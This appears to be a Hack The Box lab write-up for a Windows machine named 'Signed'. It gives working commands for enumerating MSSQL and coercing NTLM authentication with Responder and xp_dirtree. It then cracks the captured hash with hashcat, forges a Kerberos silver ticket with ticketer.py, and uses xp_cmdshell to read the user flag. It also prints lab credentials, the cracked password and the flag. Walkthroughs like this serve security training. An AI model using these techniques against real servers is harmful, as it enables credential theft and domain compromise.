# Signed Windows Machine - HTB LABS

## Phase 1: enumeration
Start a nmap enumeration:
````
nmap -sV -T4 -Pn 10.129.244.23
````

Output:
Port **1433** : Microsoft SQL Server 2022
Domain Controller : **DC01.SIGNED.htb**


Default credential:
### Default Credentials
```
Username: scott
Password: Sm230#C5NatH
```
try to connect on th msdb
```
impacket-mssqlclient scott:'Sm230#C5NatH'@10.10.11.90 -windows-auth
```
we can see some info like: mapped guest in SQL Server (limited privilege)


## Explore
test recon command
SELECT IS_SRVROLEMEMBER('sysadmin'); -- 0 
(no admin)
SELECT name FROM sys.databases; -- master, tempdb, model, msdb 
(No prilege)

another attack way is MITM 

NOTE : MSSQL, Responder can be used to capture NTLM authentication hashes when a client attempts to connect to a SQL Server. (service account)

use the tool responder for this attack
````
sudo responder -I tun0 -v
````

in the mssql bash 
````
EXEC xp_dirtree '\\10.10.14.18\share';
````

Hash for SIGNED\mssqlsvc captured

save the hash in the file hash.txt and crack with hashcat
````
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
````

We found the password of mssqlsvc: purPLE9795!@


# Attack

NOTE: What is a silver and golden ticket attack
Silver Ticket:
Required context:

You have the NTLM hash of a service account (not KRBTGT)
The account has an SPN (Service Principal Name)
You know the Domain SID

What it allows:

Forge TGS (Ticket Granting Service) tickets for a specific service
Access to ONE single service (CIFS, HTTP, MSSQL, etc.)
More stealthy than a Golden Ticket
Does NOT require contacting the DC

Golden Ticket vs Silver Ticket:
Golden Ticket
Required context:

You have the NTLM hash of the KRBTGT account
Obtained via DCSync, secretsdump, or NTDS.dit dump
You know the Domain SID

create silver ticket:
````
ticketer.py -nthash "$(pypykatz crypto nt 'purPLE9795!@')" \
    -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" \
    -groups 1105,512 \
    -domain "signed.htb" \
    -spn "MSSQLSvc/DC01.SIGNED.HTB:1433" \
    -user-id 500 \
````

Now we are mapped dbo user mssql and we have the xp_cmdshell enable
````
xp_cmdshell type C:\Users\mssqlsvc\Desktop\user.txt
````

User flag: 1d00463365b8764a4ffde316e6ae8072

